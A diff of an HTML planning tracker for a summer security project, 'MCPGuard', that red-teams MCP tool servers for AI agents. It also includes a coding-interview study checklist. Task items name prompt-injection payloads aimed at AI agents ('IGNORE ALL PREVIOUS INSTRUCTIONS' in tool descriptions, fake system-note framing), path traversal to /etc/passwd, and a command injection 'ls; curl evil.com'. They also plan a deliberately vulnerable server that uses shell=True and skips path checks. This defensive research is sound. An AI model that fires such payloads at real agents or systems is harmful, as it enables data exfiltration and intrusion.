@@ -5,406 +5,497 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Summer 2026 — MCPGuard + DSA Tracker</title>
 <style>
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f9f9f8; --surface: #ffffff; --surface2: #f3f2f0;
+  --border: rgba(0,0,0,0.1); --border-strong: rgba(0,0,0,0.2);
+  --text: #1a1a18; --text2: #5a5a56; --text3: #9a9a94;
+  --red: #c0392b; --red-bg: #fdf0ef;
+  --blue: #185fa5; --blue-bg: #e6f1fb;
+  --green: #2d7a3a; --green-bg: #eaf3de;
+  --amber: #8a4f0a; --amber-bg: #faeeda;
+  --purple: #4a3db5; --purple-bg: #eeedfe;
+  --teal: #0a6b5e; --teal-bg: #e0f4f1;
+  --radius: 10px; --radius-sm: 6px;
+}
+@media (prefers-color-scheme: dark) {
   :root {
-    --bg: #f9f9f8; --surface: #ffffff; --surface2: #f3f2f0;
-    --border: rgba(0,0,0,0.1); --border-strong: rgba(0,0,0,0.18);
-    --text: #1a1a18; --text2: #5a5a56; --text3: #9a9a94;
-    --red: #c0392b; --red-bg: #fdf0ef;
-    --blue: #185fa5; --blue-bg: #e6f1fb;
-    --green: #2d7a3a; --green-bg: #eaf3de;
-    --amber: #8a4f0a; --amber-bg: #faeeda;
-    --purple: #4a3db5; --purple-bg: #eeedfe;
-    --radius: 10px; --radius-sm: 6px;
+    --bg: #1a1a18; --surface: #242422; --surface2: #2e2e2c;
+    --border: rgba(255,255,255,0.1); --border-strong: rgba(255,255,255,0.2);
+    --text: #f0f0ec; --text2: #b0b0aa; --text3: #707068;
+    --red: #f09595;    --red-bg: rgba(192,57,43,0.2);
+    --blue: #85b7eb;   --blue-bg: rgba(24,95,165,0.2);
+    --green: #97c459;  --green-bg: rgba(45,122,58,0.2);
+    --amber: #ef9f27;  --amber-bg: rgba(138,79,10,0.2);
+    --purple: #afa9ec; --purple-bg: rgba(74,61,181,0.2);
+    --teal: #4ecdc4;   --teal-bg: rgba(10,107,94,0.2);
   }
-  @media (prefers-color-scheme: dark) {
-    :root {
-      --bg: #1a1a18; --surface: #242422; --surface2: #2e2e2c;
-      --border: rgba(255,255,255,0.1); --border-strong: rgba(255,255,255,0.18);
-      --text: #f0f0ec; --text2: #b0b0aa; --text3: #707068;
-      --red: #f09595; --red-bg: rgba(192,57,43,0.18);
-      --blue: #85b7eb; --blue-bg: rgba(24,95,165,0.18);
-      --green: #97c459; --green-bg: rgba(45,122,58,0.18);
-      --amber: #ef9f27; --amber-bg: rgba(138,79,10,0.18);
-      --purple: #afa9ec; --purple-bg: rgba(74,61,181,0.18);
-    }
-  }
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); font-size: 14px; line-height: 1.6; min-height: 100vh; }
-  .container { max-width: 820px; margin: 0 auto; padding: 32px 20px 80px; }
-  .page-header { margin-bottom: 28px; padding-bottom: 20px; border-bottom: 0.5px solid var(--border-strong); }
-  .page-title { font-size: 22px; font-weight: 600; color: var(--text); margin-bottom: 4px; letter-spacing: -0.3px; }
-  .page-sub { font-size: 13px; color: var(--text3); }
-  .phase-divider { font-size: 10px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: var(--text3); padding: 16px 0 8px; border-top: 0.5px solid var(--border); margin-top: 8px; display: flex; align-items: center; gap: 10px; }
-  .phase-divider span { white-space: nowrap; }
-  .phase-line { flex: 1; height: 0.5px; background: var(--border); }
-  .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
-  .stat-card { background: var(--surface); border: 0.5px solid var(--border); border-radius: var(--radius-sm); padding: 12px 14px; }
-  .stat-n { font-size: 24px; font-weight: 600; color: var(--text); line-height: 1.1; }
-  .stat-l { font-size: 11px; color: var(--text3); margin-top: 3px; }
-  .main-prog-wrap { background: var(--border); border-radius: 4px; height: 5px; margin-bottom: 8px; overflow: hidden; }
-  .main-prog-fill { height: 100%; border-radius: 4px; background: var(--green); transition: width 0.4s ease; }
-  .prog-label { font-size: 11px; color: var(--text3); margin-bottom: 24px; text-align: right; }
-  .legend { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 20px; }
-  .leg-item { display: flex; align-items: center; gap: 5px; font-size: 12px; color: var(--text2); }
-  .leg-dot { width: 8px; height: 8px; border-radius: 2px; flex-shrink: 0; }
-  .controls { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; flex-wrap: wrap; gap: 8px; }
-  .controls-left { display: flex; gap: 6px; flex-wrap: wrap; }
-  .filter-btn { font-size: 12px; padding: 4px 10px; border-radius: var(--radius-sm); border: 0.5px solid var(--border-strong); background: var(--surface); color: var(--text2); cursor: pointer; transition: all 0.15s; }
-  .filter-btn:hover { background: var(--surface2); color: var(--text); }
-  .filter-btn.active { background: var(--text); color: var(--bg); border-color: var(--text); }
-  .reset-btn { font-size: 12px; padding: 4px 10px; border-radius: var(--radius-sm); border: 0.5px solid var(--border); background: none; color: var(--text3); cursor: pointer; transition: all 0.15s; }
-  .reset-btn:hover { border-color: var(--red); color: var(--red); }
-  .week-card { background: var(--surface); border: 0.5px solid var(--border); border-radius: var(--radius); margin-bottom: 10px; overflow: hidden; transition: border-color 0.15s; }
-  .week-card:hover { border-color: var(--border-strong); }
-  .week-card.hidden { display: none; }
-  .week-header { display: flex; align-items: center; gap: 10px; padding: 13px 16px; cursor: pointer; user-select: none; transition: background 0.1s; }
-  .week-header:hover { background: var(--surface2); }
-  .badge { font-size: 10px; font-weight: 600; padding: 2px 8px; border-radius: 4px; letter-spacing: 0.04em; white-space: nowrap; flex-shrink: 0; }
-  .badge-gray { background: var(--surface2); color: var(--text3); border: 0.5px solid var(--border); }
-  .badge-red { background: var(--red-bg); color: var(--red); }
-  .badge-blue { background: var(--blue-bg); color: var(--blue); }
-  .badge-green { background: var(--green-bg); color: var(--green); }
-  .badge-amber { background: var(--amber-bg); color: var(--amber); }
-  .badge-purple { background: var(--purple-bg); color: var(--purple); }
-  .week-title { font-size: 13px; font-weight: 500; color: var(--text); flex: 1; }
-  .week-dates { font-size: 11px; color: var(--text3); white-space: nowrap; }
-  .week-count { font-size: 11px; color: var(--text3); white-space: nowrap; min-width: 32px; text-align: right; }
-  .chevron { width: 16px; height: 16px; color: var(--text3); transition: transform 0.2s; flex-shrink: 0; }
-  .chevron.open { transform: rotate(180deg); }
-  .mini-prog-wrap { height: 2px; background: var(--border); overflow: hidden; }
-  .mini-prog-fill { height: 100%; background: var(--green); transition: width 0.3s; }
-  .week-body { display: none; padding: 4px 16px 14px; }
-  .week-body.open { display: block; }
-  .section-label { font-size: 10px; font-weight: 600; letter-spacing: 0.07em; text-transform: uppercase; color: var(--text3); margin: 14px 0 6px; }
-  .task-row { display: flex; align-items: flex-start; gap: 9px; padding: 5px 0; border-bottom: 0.5px solid var(--border); }
-  .task-row:last-child { border-bottom: none; }
-  .task-row input[type="checkbox"] { margin-top: 2px; flex-shrink: 0; width: 14px; height: 14px; cursor: pointer; accent-color: var(--green); }
-  .task-label { font-size: 12px; color: var(--text2); line-height: 1.5; cursor: pointer; flex: 1; transition: color 0.1s; }
-  .task-label.done { color: var(--text3); text-decoration: line-through; }
-  .tag { font-size: 10px; padding: 1px 6px; border-radius: 3px; display: inline-block; margin-left: 5px; vertical-align: middle; white-space: nowrap; flex-shrink: 0; }
-  .tag-p { background: var(--red-bg); color: var(--red); }
-  .tag-d { background: var(--blue-bg); color: var(--blue); }
-  .tag-s { background: var(--green-bg); color: var(--green); }
-  .tag-l { background: var(--amber-bg); color: var(--amber); }
-  .deadline-note { font-size: 11px; color: var(--amber); background: var(--amber-bg); border-radius: var(--radius-sm); padding: 6px 10px; margin-bottom: 10px; }
-  @media (max-width: 520px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } .week-dates { display: none; } }
+}
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); font-size: 14px; line-height: 1.6; min-height: 100vh; }
+.container { max-width: 860px; margin: 0 auto; padding: 32px 20px 80px; }
+
+/* ── header ── */
+.page-header { margin-bottom: 28px; padding-bottom: 20px; border-bottom: 0.5px solid var(--border-strong); }
+.page-title { font-size: 22px; font-weight: 600; letter-spacing: -0.3px; }
+.page-sub { font-size: 13px; color: var(--text3); margin-top: 3px; }
+
+/* ── stats ── */
+.stats-grid { display: grid; grid-template-columns: repeat(5,1fr); gap: 10px; margin-bottom: 20px; }
+.stat-card { background: var(--surface); border: 0.5px solid var(--border); border-radius: var(--radius-sm); padding: 12px 14px; }
+.stat-n { font-size: 22px; font-weight: 600; line-height: 1.1; }
+.stat-l { font-size: 11px; color: var(--text3); margin-top: 3px; }
+
+/* ── progress ── */
+.main-prog-wrap { background: var(--border); border-radius: 4px; height: 5px; margin-bottom: 8px; overflow: hidden; }
+.main-prog-fill { height: 100%; border-radius: 4px; background: var(--green); transition: width .4s ease; }
+.prog-label { font-size: 11px; color: var(--text3); text-align: right; margin-bottom: 24px; }
+
+/* ── legend ── */
+.legend { display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 20px; }
+.leg-item { display: flex; align-items: center; gap: 5px; font-size: 12px; color: var(--text2); }
+.leg-dot { width: 8px; height: 8px; border-radius: 2px; flex-shrink: 0; }
+
+/* ── controls ── */
+.controls { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; flex-wrap: wrap; gap: 8px; }
+.controls-left { display: flex; gap: 6px; flex-wrap: wrap; }
+.filter-btn { font-size: 12px; padding: 4px 10px; border-radius: var(--radius-sm); border: 0.5px solid var(--border-strong); background: var(--surface); color: var(--text2); cursor: pointer; transition: all .15s; }
+.filter-btn:hover { background: var(--surface2); color: var(--text); }
+.filter-btn.active { background: var(--text); color: var(--bg); border-color: var(--text); }
+.reset-btn { font-size: 12px; padding: 4px 10px; border-radius: var(--radius-sm); border: 0.5px solid var(--border); background: none; color: var(--text3); cursor: pointer; }
+.reset-btn:hover { border-color: var(--red); color: var(--red); }
+
+/* ── phase divider ── */
+.phase-divider { font-size: 10px; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; color: var(--text3); padding: 18px 0 8px; display: flex; align-items: center; gap: 10px; }
+.phase-divider span { white-space: nowrap; }
+.phase-line { flex: 1; height: 0.5px; background: var(--border-strong); }
+
+/* ── week card ── */
+.week-card { background: var(--surface); border: 0.5px solid var(--border); border-radius: var(--radius); margin-bottom: 10px; overflow: hidden; transition: border-color .15s; }
+.week-card:hover { border-color: var(--border-strong); }
+.week-card.hidden { display: none; }
+
+/* ── week header ── */
+.week-header { display: flex; align-items: center; gap: 8px; padding: 11px 14px; cursor: pointer; user-select: none; }
+.week-header:hover { background: var(--surface2); }
+.badge { font-size: 10px; font-weight: 600; padding: 2px 8px; border-radius: 4px; letter-spacing: .04em; white-space: nowrap; flex-shrink: 0; }
+.badge-gray   { background: var(--surface2); color: var(--text3); border: 0.5px solid var(--border); }
+.badge-red    { background: var(--red-bg);    color: var(--red); }
+.badge-blue   { background: var(--blue-bg);   color: var(--blue); }
+.badge-green  { background: var(--green-bg);  color: var(--green); }
+.badge-amber  { background: var(--amber-bg);  color: var(--amber); }
+.badge-teal   { background: var(--teal-bg);   color: var(--teal); }
+.badge-purple { background: var(--purple-bg); color: var(--purple); }
+.week-title { font-size: 13px; font-weight: 500; flex: 1; min-width: 0; }
+.week-meta { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
+.week-dates-pill { font-size: 11px; color: var(--text3); background: var(--surface2); border: 0.5px solid var(--border); border-radius: 20px; padding: 1px 9px; white-space: nowrap; }
+.week-count { font-size: 11px; color: var(--text3); white-space: nowrap; min-width: 30px; text-align: right; }
+.chevron { width: 15px; height: 15px; color: var(--text3); transition: transform .2s; flex-shrink: 0; }
+.chevron.open { transform: rotate(180deg); }
+
+/* ── mini progress bar ── */
+.mini-prog-wrap { height: 2px; background: var(--border); overflow: hidden; }
+.mini-prog-fill { height: 100%; background: var(--green); transition: width .3s; }
+
+/* ── week body ── */
+.week-body { display: none; padding: 2px 14px 14px; }
+.week-body.open { display: block; }
+.section-label { font-size: 10px; font-weight: 600; letter-spacing: .07em; text-transform: uppercase; color: var(--text3); margin: 14px 0 5px; }
+
+/* ── task row ── */
+.task-row { display: flex; align-items: flex-start; gap: 8px; padding: 5px 0; border-bottom: 0.5px solid var(--border); }
+.task-row:last-child { border-bottom: none; }
+.task-row input[type="checkbox"] { margin-top: 2px; flex-shrink: 0; width: 14px; height: 14px; cursor: pointer; accent-color: var(--green); }
+.task-label { font-size: 12px; color: var(--text2); line-height: 1.5; cursor: pointer; flex: 1; }
+.task-label.done { color: var(--text3); text-decoration: line-through; }
+.tag { font-size: 10px; padding: 1px 6px; border-radius: 3px; display: inline-block; margin-left: 5px; vertical-align: middle; white-space: nowrap; }
+.tag-p { background: var(--red-bg);    color: var(--red); }
+.tag-d { background: var(--blue-bg);   color: var(--blue); }
+.tag-s { background: var(--green-bg);  color: var(--green); }
+.tag-l { background: var(--amber-bg);  color: var(--amber); }
+.tag-x { background: var(--teal-bg);   color: var(--teal); }
+.tag-c { background: var(--purple-bg); color: var(--purple); }
+.delete-btn { background: none; border: none; color: var(--text3); cursor: pointer; font-size: 14px; padding: 0 2px; line-height: 1; flex-shrink: 0; opacity: 0; transition: opacity .15s; }
+.task-row:hover .delete-btn { opacity: 1; }
+.delete-btn:hover { color: var(--red); }
+
+/* ── alert box ── */
+.alert-box { font-size: 12px; color: var(--teal); background: var(--teal-bg); border: 0.5px solid var(--teal); border-radius: var(--radius-sm); padding: 8px 12px; margin: 10px 0 4px; line-height: 1.5; }
+.alert-box strong { font-weight: 600; }
+
+/* ── add task UI ── */
+.add-task-bar { margin-top: 12px; }
+.add-task-toggle { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--text3); background: none; border: 0.5px dashed var(--border-strong); border-radius: var(--radius-sm); padding: 6px 12px; cursor: pointer; width: 100%; transition: all .15s; }
+.add-task-toggle:hover { color: var(--text); border-color: var(--text3); background: var(--surface2); }
+.add-task-toggle svg { flex-shrink: 0; }
+.add-task-form { display: none; margin-top: 8px; background: var(--surface2); border: 0.5px solid var(--border-strong); border-radius: var(--radius-sm); padding: 12px; }
+.add-task-form.open { display: block; }
+.add-task-row { display: flex; gap: 8px; margin-bottom: 8px; flex-wrap: wrap; }
+.add-task-input { flex: 1; min-width: 200px; font-size: 12px; padding: 6px 10px; border-radius: var(--radius-sm); border: 0.5px solid var(--border-strong); background: var(--surface); color: var(--text); outline: none; }
+.add-task-input:focus { border-color: var(--blue); }
+.add-task-select { font-size: 12px; padding: 6px 10px; border-radius: var(--radius-sm); border: 0.5px solid var(--border-strong); background: var(--surface); color: var(--text); outline: none; cursor: pointer; }
+.add-task-select:focus { border-color: var(--blue); }
+.add-task-actions { display: flex; gap: 6px; }
+.btn-add { font-size: 12px; padding: 5px 14px; border-radius: var(--radius-sm); border: none; background: var(--text); color: var(--bg); cursor: pointer; font-weight: 500; }
+.btn-add:hover { opacity: .85; }
+.btn-cancel { font-size: 12px; padding: 5px 12px; border-radius: var(--radius-sm); border: 0.5px solid var(--border-strong); background: none; color: var(--text3); cursor: pointer; }
+.btn-cancel:hover { color: var(--text); }
+
+@media (max-width: 600px) {
+  .stats-grid { grid-template-columns: repeat(3,1fr); }
+  .week-dates-pill { display: none; }
+}
 </style>
 </head>
 <body>
 <div class="container">
 
-  <div class="page-header">
-    <div class="page-title">Summer 2026 — MCPGuard + DSA</div>
-    <div class="page-sub">Jun 13 → Aug 20 &nbsp;·&nbsp; Labelbox ends Jul 31 &nbsp;·&nbsp; CMU starts late August</div>
+<div class="page-header">
+  <div class="page-title">MCPGuard + DSA — Summer 2026</div>
+  <div class="page-sub">Jun 13 → Aug 20 &nbsp;·&nbsp; Labelbox ends Jul 31 &nbsp;·&nbsp; internal PoC target: mid-July &nbsp;·&nbsp; CMU starts late August</div>
+</div>
+
+<div class="stats-grid">
+  <div class="stat-card"><div class="stat-n" id="s-done">0</div><div class="stat-l">done total</div></div>
+  <div class="stat-card"><div class="stat-n" id="s-proj">0</div><div class="stat-l">project</div></div>
+  <div class="stat-card"><div class="stat-n" id="s-dsa">0</div><div class="stat-l">DSA</div></div>
+  <div class="stat-card"><div class="stat-n" id="s-poc">0</div><div class="stat-l">internal PoC</div></div>
+  <div class="stat-card"><div class="stat-n" id="s-pct">0%</div><div class="stat-l">overall</div></div>
+</div>
+
+<div class="main-prog-wrap"><div class="main-prog-fill" id="main-prog" style="width:0%"></div></div>
+<div class="prog-label" id="prog-label">0 of 0 tasks complete</div>
+
+<div class="legend">
+  <div class="leg-item"><div class="leg-dot" style="background:var(--red)"></div>Project</div>
+  <div class="leg-item"><div class="leg-dot" style="background:var(--teal)"></div>Internal PoC</div>
+  <div class="leg-item"><div class="leg-dot" style="background:var(--blue)"></div>DSA</div>
+  <div class="leg-item"><div class="leg-dot" style="background:var(--green)"></div>Milestone</div>
+  <div class="leg-item"><div class="leg-dot" style="background:var(--purple)"></div>Custom</div>
+</div>
+
+<div class="controls">
+  <div class="controls-left">
+    <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+    <button class="filter-btn" onclick="setFilter('p',this)">Project</button>
+    <button class="filter-btn" onclick="setFilter('x',this)">Internal PoC</button>
+    <button class="filter-btn" onclick="setFilter('d',this)">DSA</button>
+    <button class="filter-btn" onclick="setFilter('s',this)">Milestones</button>
+    <button class="filter-btn" onclick="setFilter('c',this)">Custom</button>
   </div>
+  <button class="reset-btn" onclick="resetAll()">Reset all</button>
+</div>
 
-  <div class="stats-grid">
-    <div class="stat-card"><div class="stat-n" id="s-done">0</div><div class="stat-l">tasks done</div></div>
-    <div class="stat-card"><div class="stat-n" id="s-proj">0</div><div class="stat-l">project done</div></div>
-    <div class="stat-card"><div class="stat-n" id="s-dsa">0</div><div class="stat-l">DSA done</div></div>
-    <div class="stat-card"><div class="stat-n" id="s-pct">0%</div><div class="stat-l">overall</div></div>
-  </div>
-
-  <div class="main-prog-wrap"><div class="main-prog-fill" id="main-prog" style="width:0%"></div></div>
-  <div class="prog-label" id="prog-label">0 of 0 tasks complete</div>
-
-  <div class="legend">
-    <div class="leg-item"><div class="leg-dot" style="background:var(--red)"></div>Project (MCPGuard)</div>
-    <div class="leg-item"><div class="leg-dot" style="background:var(--blue)"></div>DSA / interview prep</div>
-    <div class="leg-item"><div class="leg-dot" style="background:var(--amber)"></div>Labelbox POC</div>
-    <div class="leg-item"><div class="leg-dot" style="background:var(--green)"></div>Milestone / ship</div>
-  </div>
-
-  <div class="controls">
-    <div class="controls-left">
-      <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
-      <button class="filter-btn" onclick="setFilter('p',this)">Project</button>
-      <button class="filter-btn" onclick="setFilter('d',this)">DSA</button>
-      <button class="filter-btn" onclick="setFilter('l',this)">Labelbox</button>
-      <button class="filter-btn" onclick="setFilter('s',this)">Milestones</button>
-    </div>
-    <button class="reset-btn" onclick="resetAll()">Reset all</button>
-  </div>
-
-  <div id="weeks-container"></div>
+<div id="weeks-container"></div>
 </div>
 
 <script>
-const KEY = 'mcpguard_tracker_v4';
-let state = {};
-try { state = JSON.parse(localStorage.getItem(KEY) || '{}'); } catch(e) {}
+const KEY = 'mcpguard_tracker_v6';
 let activeFilter = 'all';
 
+// ── persisted state shape ──
+// state.checks  : { taskId: bool }
+// state.custom  : { wid: [{id, text, tag}] }
+let state = { checks: {}, custom: {} };
+try {
+  const raw = JSON.parse(localStorage.getItem(KEY) || 'null');
+  if (raw && raw.checks) state = raw;
+  else if (raw) state = { checks: raw, custom: {} }; // migrate old format
+} catch(e) {}
+
+function save() { try { localStorage.setItem(KEY, JSON.stringify(state)); } catch(e) {} }
+
+// ── week data ──
 const weeks = [
   {
-    id:'w0', phase:'Phase 1 — internship running (Jun 13 – Jul 31)', showPhase:true,
-    title:'Week 0 — setup & scaffolding', dates:'Jun 13–15 (Sat–Mon)',
+    id:'w0', phase:'Phase 1 — Build + Observe (Jun 13 – Jul 31)', showPhase:true,
+    title:'Week 0 — authorization + scaffolding', dates:'Jun 13–15',
     badge:'badge-gray', badgeText:'setup', open:true,
+    alert:'⚠ Do this first: get written authorization from your manager before any active probing of internal MCP infrastructure.',
     sections:[
-      { label:'Project setup', tasks:[
-        {t:'Create MCPGuard GitHub repo — MIT license, README stub, .gitignore', tag:'p'},
-        {t:'Set up Python venv — install mcp>=1.27,<2, anthropic SDK, PyYAML, pytest, jsonlines', tag:'p'},
-        {t:'Read MCP spec 2025-11-25: focus on tools/list and tools/call message formats (2 hrs)', tag:'p'},
-        {t:'Build 2-tool hello-world MCP server from scratch using the Python SDK (add, read_file)', tag:'p'},
+      { label:'Authorization (do before anything else)', tasks:[
+        {t:'Send manager authorization message — get written OK to observe + test internal MCP servers', tag:'x'},
+        {t:'Clarify scope: which MCP servers are in-scope, passive vs active testing boundary', tag:'x'},
+        {t:'Confirm: findings stay internal until coordinated disclosure with manager sign-off', tag:'x'},
+      ]},
+      { label:'Project scaffolding', tasks:[
+        {t:'Create MCPGuard repo structure: attack/, gateway/, report/, docs/, tests/', tag:'p'},
+        {t:'Set up Python venv — install mcp>=1.27,<2, anthropic, PyYAML, jsonlines, pytest, rich', tag:'p'},
+        {t:'Read MCP spec 2025-11-25: tools/list and tools/call message formats (2 hrs)', tag:'p'},
+        {t:'Build 2-tool hello-world MCP server with Python SDK to understand protocol basics', tag:'p'},
+        {t:'Commit CLAUDE.md and README.md to repo root', tag:'s'},
       ]},
       { label:'DSA setup', tasks:[
         {t:'Create NeetCode account — enable NeetCode 150 roadmap, set language to Python', tag:'d'},
-        {t:'Configure LeetCode account — set default language to Python 3', tag:'d'},
-        {t:'Read the cold-start framework: restate → example → brute force → optimize → code → test', tag:'d'},
-        {t:'Solve first 3 NeetCode problems cold: Two Sum, Valid Anagram, Contains Duplicate', tag:'d'},
+        {t:'Configure LeetCode — default to Python 3, read cold-start framework', tag:'d'},
+        {t:'Solve first 3 problems cold: Two Sum, Valid Anagram, Contains Duplicate', tag:'d'},
       ]},
     ]
   },
   {
     id:'w1',
-    title:'Week 1 — MCP internals + arrays/hashing', dates:'Jun 16–22',
-    badge:'badge-red', badgeText:'module A',
+    title:'Week 1 — passive observation + arrays/hashing', dates:'Jun 16–22',
+    badge:'badge-teal', badgeText:'observe',
+    alert:'Passive only this week — read traffic, do not modify or inject anything.',
     sections:[
-      { label:'Project — Mon / Wed / Fri (~1.5 hrs each)', tasks:[
-        {t:'Run mitmproxy against your Burp MCP or Jira MCP in Cursor — read raw JSON-RPC traffic', tag:'p'},
-        {t:'Read JSON-RPC 2.0 spec (30 min) — understand request, response, notification structure', tag:'p'},
-        {t:'Design vulnerable MCP server schema: 3 tools — read_file, run_shell, send_data', tag:'p'},
-        {t:'Implement vulnerable_server.py: read_file with no path validation or canonicalization', tag:'p'},
-        {t:'Implement run_shell tool: passes args directly to subprocess.run(shell=True)', tag:'p'},
+      { label:'Internal PoC — observer mode (passive)', tasks:[
+        {t:'Point mitmproxy at Burp Suite MCP in Cursor — capture a full session of tools/list responses', tag:'x'},
+        {t:'Point mitmproxy at Jira MCP — capture tools/list and sample tools/call traffic', tag:'x'},
+        {t:'Catalog all exposed tools: name, description, argument schema for each server', tag:'x'},
+        {t:'Flag anything interesting: shell args, path args, tokens in descriptions, unusual instructions', tag:'x'},
+        {t:'Build observer_notes.md: raw findings, questions, hypotheses for active testing', tag:'x'},
       ]},
-      { label:'DSA — daily 2 hrs Mon–Fri + weekend timed session', tasks:[
+      { label:'Project — parallel build', tasks:[
+        {t:'Implement vulnerable_server.py: read_file (no path validation), run_shell (shell=True), send_data', tag:'p'},
+        {t:'Read JSON-RPC 2.0 spec (30 min) — understand request/response/notification structure', tag:'p'},
+      ]},
+      { label:'DSA — daily 2 hrs Mon–Fri + weekend session', tasks:[
         {t:'Arrays: Two Sum, Best Time to Buy/Sell Stock, Product of Array Except Self', tag:'d'},
         {t:'Hashing: Valid Anagram, Group Anagrams, Top K Frequent Elements', tag:'d'},
         {t:'Two pointers: Valid Palindrome, 3Sum, Container With Most Water', tag:'d'},
-        {t:'Practice cold-start framework on all 9 problems above — time each attempt', tag:'d'},
         {t:'Weekend timed session: 3 problems, 35 min each, no hints — log patterns that tripped you', tag:'d'},
-      ]},
-      { label:'Labelbox', tasks:[
-        {t:'Draft 1-paragraph POC pitch for manager: "audit what our MCP servers are doing"', tag:'l'},
       ]},
     ]
   },
   {
     id:'w2',
-    title:'Week 2 — attack payloads + sliding window/stack', dates:'Jun 23–29',
-    badge:'badge-red', badgeText:'module A',
+    title:'Week 2 — recon analysis + first payloads, sliding window/stack', dates:'Jun 23–29',
+    badge:'badge-teal', badgeText:'recon',
     sections:[
-      { label:'Project — Mon / Wed / Fri', tasks:[
-        {t:'Write payload class 1: naive_override.py — [IGNORE ALL PREVIOUS INSTRUCTIONS] in description', tag:'p'},
-        {t:'Write payload class 2: steganographic_embed.py — [SYSTEM NOTE: audit logging requires...] framing', tag:'p'},
-        {t:'Write payload class 3: param_name_encoding.py — inject instruction into parameter name field', tag:'p'},
-        {t:'Manually verify payload 1 works: connect Claude agent to vulnerable server, confirm exfil', tag:'p'},
-        {t:'Add verify_success() method to each payload class — checks agent tool call log for injected step', tag:'p'},
+      { label:'Internal PoC — recon analysis', tasks:[
+        {t:'Analyze observer_notes.md: rank findings by blast radius (exec > fs > data > auth)', tag:'x'},
+        {t:'Identify top 2–3 testable hypotheses from observation', tag:'x'},
+        {t:'Check tool descriptions for unusual content: hidden instructions, overly broad permissions', tag:'x'},
+        {t:'Check if any MCP server binds to 0.0.0.0 or is reachable from other machines on network', tag:'x'},
+        {t:'Share update with manager — confirm scope for active testing next week', tag:'x'},
       ]},
-      { label:'DSA — daily 2 hrs + weekend session', tasks:[
-        {t:'Sliding window: Longest Substring Without Repeating, Max Profit, Minimum Window Substring', tag:'d'},
+      { label:'Project — payloads (informed by recon)', tasks:[
+        {t:'Write payload base class: fire(server_url) + verify_success() interface', tag:'p'},
+        {t:'Write payload 1: naive_override.py — [IGNORE ALL PREVIOUS INSTRUCTIONS] in description', tag:'p'},
+        {t:'Write payload 2: steganographic_embed.py — authority framing [SYSTEM NOTE: compliance...]', tag:'p'},
+        {t:'Write payload 3: param_name_encoding.py — instruction in parameter name field', tag:'p'},
+        {t:'Test all 3 against local vulnerable_server — confirm exploits fire before internal use', tag:'p'},
+      ]},
+      { label:'DSA — daily 2 hrs', tasks:[
+        {t:'Sliding window: Longest Substring Without Repeating, Permutation in String, Min Window Substring', tag:'d'},
         {t:'Stack: Valid Parentheses, Min Stack, Evaluate Reverse Polish Notation, Daily Temperatures', tag:'d'},
         {t:'Binary search: Binary Search, Search a 2D Matrix, Find Min in Rotated Sorted Array', tag:'d'},
-        {t:'Weekend timed session: 3 mediums, 90 min cold — log which patterns you struggled with', tag:'d'},
-      ]},
-      { label:'Labelbox', tasks:[
-        {t:'Present POC pitch to manager — get greenlight or revised scope', tag:'l'},
+        {t:'Weekend timed session: 3 mediums, 90 min cold', tag:'d'},
       ]},
     ]
   },
   {
     id:'w3',
-    title:'Week 3 — injection payloads + test harness, linked lists', dates:'Jun 30–Jul 6',
-    badge:'badge-red', badgeText:'module A',
+    title:'Week 3 — active internal testing (authorized)', dates:'Jun 30–Jul 6',
+    badge:'badge-teal', badgeText:'active test',
+    alert:'⚠ Active testing week. Confirm written authorization is in hand before starting any probe below. Test in dev/staging if possible.',
     sections:[
-      { label:'Project — Mon / Wed / Fri', tasks:[
-        {t:'Write payload class 4: path_traversal.py — read_file(path="../../../etc/passwd")', tag:'p'},
-        {t:'Write payload class 5: command_injection.py — run_shell(cmd="ls; curl evil.com")', tag:'p'},
-        {t:'Write test_harness.py: loops through all 5 payloads, fires each, collects structured results', tag:'p'},
-        {t:'Write result_classifier.py: parses agent output + tool call log, outputs JSON verdict per attack', tag:'p'},
-        {t:'Run full attack suite — confirm all 5 payloads fire successfully against unprotected server', tag:'p'},
-        {t:'Commit and tag: v0.1-attacker — Module A complete ✓', tag:'s'},
+      { label:'Internal PoC — active testing (authorized, targeted)', tasks:[
+        {t:'Confirm written authorization received before starting this section', tag:'x'},
+        {t:'Test hypothesis 1 from recon: attempt the specific arg/description anomaly you flagged', tag:'x'},
+        {t:'Test hypothesis 2: try argument boundary conditions on the most permissive tool found', tag:'x'},
+        {t:'Test tool description immutability: reconnect fresh session, compare tools/list hash to week 1', tag:'x'},
+        {t:'Attempt cross-tenant query if a DB-connected MCP server exists', tag:'x'},
+        {t:'Document every test: input, expected behavior, actual behavior, screenshot/log', tag:'x'},
       ]},
-      { label:'DSA — daily 2 hrs + weekend OA simulation', tasks:[
-        {t:'Linked lists: Reverse Linked List, Merge Two Sorted Lists, Reorder List, Remove Nth From End', tag:'d'},
-        {t:'Trees intro: Invert Binary Tree, Max Depth, Same Tree, Subtree of Another Tree', tag:'d'},
-        {t:'Weekend OA simulation Sunday: 2 problems, 70 min, no hints, submit — treat like the real thing', tag:'d'},
+      { label:'Project — injection payloads + harness', tasks:[
+        {t:'Write payload 4: path_traversal.py — read_file(path="../../../etc/passwd")', tag:'p'},
+        {t:'Write payload 5: command_injection.py — run_shell(cmd="ls; curl evil.com")', tag:'p'},
+        {t:'Write test_harness.py: loops through all 5 payloads, fires each, collects results', tag:'p'},
+        {t:'Write result_classifier.py: parses agent output, outputs JSON verdict per attack', tag:'p'},
+        {t:'Run full local attack suite — confirm all 5 payloads fire against unprotected server', tag:'p'},
+        {t:'Tag v0.1-attacker — Module A complete ✓', tag:'s'},
